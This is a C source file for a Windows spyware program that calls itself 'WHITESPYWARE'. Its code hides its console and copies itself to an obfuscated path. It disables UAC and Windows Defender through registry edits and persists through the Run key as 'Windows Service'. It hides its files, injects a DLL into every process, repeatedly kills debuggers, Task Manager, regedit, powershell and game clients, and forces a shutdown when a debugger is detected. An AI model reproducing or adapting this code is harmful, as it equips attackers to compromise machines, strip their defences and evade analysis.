#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <excpt.h>
#include <tchar.h>
#include <wchar.h>
#include <tlhelp32.h>

#define ERROR_SIGN 0xFFFFFFFF
#define SUCCESS_SIGN 0x00000000
#define MAX_LENGTH 255

WCHAR TargetProcess[17][128];

/*
BOOL EXPLORER_SIGN = FALSE;

typedef HANDLE(WINAPI* PFCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32PRocessID);
typedef BOOL(WINAPI* PFProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL(WINAPI* PFProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef int(WINAPI* PFwcscmp)(const wchar_t* string1, const wchar_t* string2);
typedef HANDLE(WINAPI* PFOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef BOOL(WINAPI* PFTerminateProcess)(HANDLE hProcess, UINT uExitCode);
typedef BOOL(WINAPI* PFCloseHandle)(HANDLE hObject);
typedef HMODULE(WINAPI* PFLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI* PFGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);

typedef struct _THREAD_PARAM {
	FARPROC pFunc[2];
	char pStr[7][128];
	WCHAR WStr[17][128];
	//pStr[0] = kernel32.dll
	//pStr[1] = CreateToolhelp32Snapshot
	//pStr[2] = Process32First
	//pStr[3] = OpenProcess
	//pStr[4] = TerminateProcess
	//pStr[5] = CloseHandle
	//pStr[6] = Process32Next

	//WStr[0] = "OLLYDBG.EXE"
	//WStr[1] = "Taskmgr.exe"
	//WStr[2] = "x32dbg.exe"
	//WStr[3] = "x64dbg.exe"
	//WStr[4] = "iexplore.exe"
	//WStr[5] = "procexp64.exe"
	//WStr[6] = "procexp.exe"
	//WStr[7] = "League of Legends.exe"
	//WStr[8] = "LeagueClient.exe"
	//WStr[9] = "LeagueClientUx.exe"
	//WStr[10] = "regedit.exe"
	//WStr[11] = "powershell.exe"
	//WStr[12] = "RiotClientServices.exe"
	//WStr[13] = "RiotClientUx.exe"
	//WStr[14] = "suddenattack.exe"
	//WStr[15] = "tasklist.exe"
	//WStr[16] = "taskkill.exe"
}THREAD_PARAM, * PTHREAD_PARAM;
*/
void CheckDebugger();
//DWORD GetPID();
//void ExplorerManager();
void ProcessManager();

BOOL injectAllProcess(LPCTSTR szDllPath);
BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath);

/*
void ProcessManager(LPVOID pParam) {
	PTHREAD_PARAM param = (PTHREAD_PARAM)pParam;
	HMODULE Kernel_hMod = NULL;
	PFCreateToolhelp32Snapshot pCreateToolhelp32Snapshot = NULL;
	PFProcess32First pProcess32First = NULL;
	PFProcess32Next pProcess32Next = NULL;
	PFOpenProcess pOpenProcess = NULL;
	PFTerminateProcess pTerminateProcess = NULL;
	PFCloseHandle pCloseHandle = NULL;

	Kernel_hMod = ((PFLoadLibraryA)param->pFunc[0])(param->pStr[0]);
	pCreateToolhelp32Snapshot = (PFCreateToolhelp32Snapshot)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[1]);
	pProcess32First = (PFProcess32First)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[2]);
	pProcess32Next = (PFProcess32Next)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[6]);
	pOpenProcess = (PFOpenProcess)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[3]);
	pTerminateProcess = (PFTerminateProcess)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[4]);
	pCloseHandle = (PFCloseHandle)((PFGetProcAddress)param->pFunc[1])(Kernel_hMod, param->pStr[5]);

	while (1) {
		HANDLE hProcess = NULL;
		PROCESSENTRY32 pe32 = { 0 };
		hProcess = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
		BOOL ISCHECKED = FALSE;

		if (pProcess32First(hProcess, &pe32)) {
			do {
				if (ISCHECKED) {
					HANDLE hProcess_ = pOpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);

					if (hProcess_ != NULL) {
						pTerminateProcess(hProcess_, 0);
						pCloseHandle(hProcess_);
					}
					ISCHECKED = FALSE;
				}
			} while (pProcess32Next(hProcess, &pe32));
		}
		pCloseHandle(hProcess);
	}
}
*/

DWORD main(int argc, char* argv[]) {
	//Hide
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	HKEY RegKey = NULL;
	LONG result = 0;

	//Running
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\WHITESPYWARE"), 0, KEY_ALL_ACCESS, &RegKey);
	if (result == ERROR_SUCCESS) {
		CloseHandle(RegKey);
		return ERROR_SIGN;
	}

	HANDLE Thread[2];
	Thread[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckDebugger, NULL, 0, NULL);

	//First Run
	DWORD dwDisp = 0;
	result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\WHITESPYWARE"), 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &RegKey, &dwDisp);
	if (result != ERROR_SUCCESS) {
		return ERROR_SIGN;
	}
	CloseHandle(RegKey);
	result = 0;

	TCHAR info[MAX_LENGTH] = L"";
	unsigned char spyTemp[MAX_LENGTH] = { 0x42, 0xC5, 0xD1, 0xD8, 0xEE, 0xEF, 0xE9, 0xE0, 0xF5, 0xF1, 0xD5, 0xD8, 0xF5, 0xFF, 0xE3, 0xF0, 0xB5, 0xEB, 0xD8, 0xBA, 0xF6, 0xF5, 0xEC, 0xE5, 0xE9, 0xF5, 0x82, 0xF0, 0xE3, 0xAE, 0xE3, 0xFC, 0x00 };
	TCHAR spyFile[MAX_LENGTH] = L"";

	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, argv[0], strlen(argv[0]), info, MAX_LENGTH);

	//SpyFile Path Decrypt Algorithm
	unsigned char tmp;
	char key = 0x3a;
	char key2 = 0xbd;
	int length = strlen(spyTemp);

	for (int i = 0; i < length; i += 2) {
		tmp = spyTemp[i + 1];
		spyTemp[i + 1] = spyTemp[i];
		spyTemp[i] = tmp;
	}

	for (int i = 0; i < length; i++) {
		spyTemp[i] = spyTemp[i] ^ key2;
	}

	for (int i = 0; i < length; i++) {
		spyTemp[i] = spyTemp[i] + 1;
	}

	for (int i = 0; i < length; i++) {
		spyTemp[i] = spyTemp[i] ^ key;
	}

	//Multiplication
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, spyTemp, strlen(spyTemp), spyFile, MAX_LENGTH);
	CopyFile(info, spyFile, FALSE);

	result = 0;

	//Auto Run
	HKEY UACkey = NULL;
	DWORD UACvalue = 0;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, KEY_ALL_ACCESS, &UACkey);
	if (result != ERROR_SUCCESS) {
		CloseHandle(UACkey);
		return ERROR_SIGN;
	}
	
	else {
		result = 0;
		result = RegSetValueEx(UACkey, TEXT("EnableLUA"), 0, REG_DWORD, (const BYTE*)&UACvalue, sizeof(UACvalue));
		if (result != ERROR_SUCCESS) {
			return ERROR_SIGN;
		}

	}
	CloseHandle(UACkey);

	//Disable Windows Defender   --->   Register The Spyware Exception

	HKEY WD = NULL;
	DWORD WDvalue = 1;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &WD);
	if (result != ERROR_SUCCESS) {
		CloseHandle(WDvalue);
		return ERROR_SIGN;
	}

	else {
		result = 0;
		result = RegSetValueEx(WD, TEXT("DisableAntiSpyware"), 0, REG_DWORD, (const BYTE*)&WDvalue, sizeof(WDvalue));
		if (result != ERROR_SUCCESS) {
			return ERROR_SIGN;
		}

	}
	CloseHandle(WD);


	//Register The Spyware Exception...
	


	HKEY autokey = NULL;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &autokey);
	if (result != ERROR_SUCCESS) {
		CloseHandle(autokey);
		return ERROR_SIGN;
	}

	else {
		result = 0;
		result = RegSetValueExA(autokey, "Windows Service", 0, REG_SZ, (BYTE*)spyTemp, strlen(spyTemp));
		if (result != ERROR_SUCCESS) {
			return ERROR_SIGN;
		}
	}

	CloseHandle(autokey);

	//Hide File
	TCHAR CMD[MAX_LENGTH] = L"attrib +s +h ";
	TCHAR CMD2[MAX_LENGTH] = L"attrib +s +h ";

	lstrcatW(CMD, info);
	lstrcatW(CMD2, spyFile);

	SetFileAttributes(info, FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributes(spyFile, FILE_ATTRIBUTE_HIDDEN);

	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD, _T("C:\\"), SW_HIDE);
	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD2, _T("C:\\"), SW_HIDE);

	//Process Stealth
	LPCTSTR Path[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, Path);
	lstrcatW(Path, L"\\DLL\\BugDLL.dll");

	injectAllProcess(Path);

	//Set The Target Process'
	wcscpy(TargetProcess[0], L"OLLYDBG.EXE");
	wcscpy(TargetProcess[1], L"Taskmgr.exe");
	wcscpy(TargetProcess[2], L"x32dbg.exe");
	wcscpy(TargetProcess[3], L"x64dbg.exe");
	wcscpy(TargetProcess[4], L"iexplore.exe");
	//wcscpy(TargetProcess[5], L"procexp64.exe");
	//wcscpy(TargetProcess[6], L"procexp.exe");
	wcscpy(TargetProcess[7], L"League of Legends.exe");
	wcscpy(TargetProcess[8], L"LeagueClient.exe");
	wcscpy(TargetProcess[9], L"LeagueClientUx.exe");
	wcscpy(TargetProcess[10], L"regedit.exe");
	wcscpy(TargetProcess[11], L"powershell.exe");
	wcscpy(TargetProcess[12], L"RiotClientServices.exe");
	wcscpy(TargetProcess[13], L"RiotClientUx.exe");
	wcscpy(TargetProcess[14], L"suddenattack.exe");
	wcscpy(TargetProcess[15], L"tasklist.exe");
	wcscpy(TargetProcess[16], L"taskkill.exe");

	//Create ProcessManager Thread
	Thread[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessManager, NULL, 0, NULL);
	WaitForMultipleObjects(2, Thread, TRUE, INFINITE);

	/*
	DWORD EPID = ERROR_SIGN;
	while (1) {
		EPID = GetPID();

		if (EPID != ERROR_SIGN) {
			break;
		}
	}
	
	//Code Injection -> Explorer
	THREAD_PARAM param = { 0, };
	__int64 dwSize;

	HMODULE hMod = GetModuleHandleA("kernel32.dll");
	LPVOID pRemoteBuf[2] = { 0, };

	if (hMod) {
		param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
		param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");

		strcpy_s(param.pStr[0], 128, "kernel32.dll");
		strcpy_s(param.pStr[1], 128, "CreateToolhelp32Snapshot");
		strcpy_s(param.pStr[2], 128, "Process32First");
		strcpy_s(param.pStr[3], 128, "OpenProcess");
		strcpy_s(param.pStr[4], 128, "TerminateProcess");
		strcpy_s(param.pStr[5], 128, "CloseHandle");
		strcpy_s(param.pStr[6], 128, "Process32Next");

		wcscpy(param.WStr[0], L"OLLYDBG.EXE");
		wcscpy(param.WStr[1], L"Taskmgr.exe");
		wcscpy(param.WStr[2], L"x32dbg.exe");
		wcscpy(param.WStr[3], L"x64dbg.exe");
		wcscpy(param.WStr[4], L"iexplore.exe");
		wcscpy(param.WStr[5], L"procexp64.exe");
		wcscpy(param.WStr[6], L"procexp.exe");
		wcscpy(param.WStr[7], L"League of Legends.exe");
		wcscpy(param.WStr[8], L"LeagueClient.exe");
		wcscpy(param.WStr[9], L"LeagueClientUx.exe");
		wcscpy(param.WStr[10], L"regedit.exe");
		wcscpy(param.WStr[11], L"powershell.exe");
		wcscpy(param.WStr[12], L"RiotClientServices.exe");
		wcscpy(param.WStr[13], L"RiotClientUx.exe");
		wcscpy(param.WStr[14], L"suddenattack.exe");
		wcscpy(param.WStr[15], L"tasklist.exe");
		wcscpy(param.WStr[16], L"taskkill.exe");

		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, EPID);
		printf("[+] Target Process : 0x%p\n", hProcess);
		dwSize = sizeof(THREAD_PARAM);
		pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (pRemoteBuf[0]) {
			printf("[+] pRemoteBuf : 0x%p\n", pRemoteBuf[0]);
			WriteProcessMemory(hProcess, pRemoteBuf[0], (LPCVOID)&param, dwSize, NULL);
			dwSize = (int*)main - (int*)ProcessManager;

			pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (pRemoteBuf[1]) {
				printf("[+] ThreadBuf : 0x%p\n", pRemoteBuf[1]);
				WriteProcessMemory(hProcess, pRemoteBuf[1], (LPCVOID)ProcessManager, dwSize, NULL);

				HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL);
				if (hThread) {
					printf("[+] hThread : 0x%p\n", hThread);
					WaitForSingleObject(hThread, INFINITE);
					CloseHandle(hThread);
					CloseHandle(hProcess);

					system("pause");
				}
				else {
					return ERROR_SIGN;
				}
			}
			else {
				return ERROR_SIGN;
			}
		}
		else {
			return ERROR_SIGN;
		}
	}

	else {
		return ERROR_SIGN;
	}
	*/

	return ERROR_SIGN;
}


void ProcessManager() {
	while (1) {
		HANDLE hProcess = NULL;
		PROCESSENTRY32 pe32 = { 0 };
		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
		BOOL ISCHECKED = FALSE;
		int i = 0;

		if (Process32First(hProcess, &pe32)) {
			do {
				//Checking
				for (i = 0; i < 17; i++) {
					if (!wcscmp(pe32.szExeFile, TargetProcess[i])) {
						if (ISCHECKED == FALSE) {
							ISCHECKED = TRUE;
						}
					}
				}

				if (ISCHECKED) {
					HANDLE hProcess_ = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);

					if (hProcess_ != NULL) {
						TerminateProcess(hProcess_, 0);
						CloseHandle(hProcess_);
					}
					ISCHECKED = FALSE;
				}
			} while (Process32Next(hProcess, &pe32));
		}
		CloseHandle(hProcess);
		Sleep(500);
	}
}


void CheckDebugger() {
	while (1) {
		Sleep(1000);
		if (IsDebuggerPresent()) {
			ShellExecute(NULL, L"open", L"cmd", L"/c shutdown -s -f -t 0", L"C:\\", SW_HIDE);
		}
	}
}

BOOL injectAllProcess(LPCTSTR szDllPath) {
	DWORD dwPID = 0;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	Process32First(hSnapShot, &pe);
	do {
		dwPID = pe.th32ProcessID;
		if (dwPID < 100)
			continue;
		else
			injectDll(dwPID, szDllPath);
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);

	return TRUE;
}

BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath) {
	HANDLE hProcess, hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadProc;

	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) {
		return FALSE;
	}

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);

	WaitForSingleObject(hThread, 1000);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}


/*
DWORD GetPID() {
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcess, &pe32)) {
		do {
			if (!wcscmp(pe32.szExeFile, TEXT("explorer.exe"))) {
				HANDLE hProcess_ = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

				if (hProcess_ != NULL) {
					CloseHandle(hProcess_);
					return pe32.th32ProcessID;
				}
				else {
					return ERROR_SIGN;
				}
			}
		} while (Process32Next(hProcess, &pe32));
	}
	CloseHandle(hProcess);
	return ERROR_SIGN;
}
*/